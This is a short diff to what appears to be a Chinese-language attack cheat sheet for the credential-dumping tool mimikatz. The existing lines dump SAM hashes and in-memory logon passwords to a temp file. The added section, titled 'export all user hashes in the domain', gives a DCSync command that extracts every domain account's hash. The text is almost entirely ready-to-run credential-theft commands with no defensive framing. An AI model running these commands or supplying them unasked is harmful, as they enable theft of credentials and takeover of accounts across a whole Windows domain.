@@ -50,3 +50,9 @@ mimikatz "log" "lsadump::sam /sam:sam.hive /system:system.hive"  "exit"
 cd /d D:\tools\
 mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > C:\windows\temp\log.txt
 ```
+
+## 导出域内所有用户hash
+
+```
+mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv" exit
+```
